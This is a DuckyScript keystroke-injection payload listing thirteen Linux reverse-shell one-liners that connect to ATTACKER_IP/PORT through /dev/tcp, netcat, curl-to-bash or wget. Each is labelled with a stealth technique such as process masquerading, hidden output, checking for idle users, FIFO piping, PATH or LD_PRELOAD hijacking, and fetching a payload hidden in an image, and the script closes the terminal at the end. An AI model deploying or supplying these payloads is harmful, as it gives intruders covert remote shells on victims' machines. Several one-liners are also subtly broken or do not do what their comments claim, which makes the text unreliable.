REM Pick one of the methods below, remove the "#" to activate, and leave delay and close at the end.

DELAY 0
DEFAULT_DELAY 0

# 1. Process Masquerading: This method renames the reverse shell process to a more legitimate name to avoid suspicion.
# STRING bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 & disown; exec -a legitimate_process_name bash'
# ENTER

# 2. Using Legitimate Tools for Execution: Utilizes the "nohup" command to run the reverse shell in the background, even after the terminal closes, reducing detectability.
# STRING nohup /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 & disown
# ENTER

# 3. Disabling Logging: Temporarily redirects standard output and error streams to /dev/null, ensuring no logs are written during the execution of the reverse shell.
# STRING exec 3>&1 4>&2; exec 1>/dev/null 2>/dev/null; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 & disown; exec 1>&3 2>&4
# ENTER

# 4. Stealth Mode Execution: Uses "nohup" and "disown" to execute the reverse shell with minimal visibility in the terminal, making the process less noticeable.
# STRING bash -c 'nohup bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 & disown'
# ENTER

# 5. Fork Bomb Prevention: Ensures that only a limited number of bash processes are running to prevent overwhelming the system, then executes the reverse shell.
# STRING bash -c '[[ $(pgrep bash | wc -l) -lt 5 ]] && bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 & disown'
# ENTER

# 6. User Interaction Detection: Checks if the system is idle (no active sessions) before executing the reverse shell, reducing the chance of immediate detection by a user.
# STRING bash -c 'if [[ -z $(who -T | grep "+" | awk "{print $6}") ]]; then bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 & disown; fi'
# ENTER

# 7. Network Evasion: Executes the reverse shell by downloading and running a script from a remote server, masking it as a legitimate network request.
# STRING bash -c 'curl http://ATTACKER_IP:PORT/shell.sh | bash & disown'
# ENTER

# 8. Memory-resident Execution: Encodes the reverse shell command into a base64 string, decodes, and executes it directly from memory, avoiding disk I/O to reduce detection.
# STRING echo 'bash -c "exec -a legitimate_process_name nohup bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"' | base64 | base64 -d | bash &
# ENTER

# 9. Named Pipe (FIFO) Execution: Uses a named pipe (FIFO) for executing the reverse shell, which can help in bypassing traditional process monitoring mechanisms.
# STRING mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f &
# ENTER

# 10. Steganography-based Execution: Hides the reverse shell payload within an image file using steganography. The script extracts and executes the payload from the image.
# STRING wget http://ATTACKER_IP/payload.png -O /tmp/payload.png; strings /tmp/payload.png | tail -n 1 | bash &
# ENTER

# 11. Environmental Variable Hijacking: Modifies the PATH environment variable to include the reverse shell command, which is executed whenever a command is run in the shell.
# STRING export PATH=$(echo $PATH | sed 's/:/;bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &;/')
# ENTER

# 12. Signal-based Trigger: Sets a trap to execute the reverse shell only when a specific signal (e.g., HUP) is received, delaying execution until the signal is triggered.
# STRING trap 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &' HUP; kill -HUP $$
# ENTER

# 13. Dynamic Linker Hijacking: Uses the LD_PRELOAD environment variable to inject a shared object that contains the reverse shell payload, executing it before any other command.
# STRING LD_PRELOAD=/tmp/payload.so bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &
# ENTER

# Close the terminal window after execution
STRING exit
ENTER
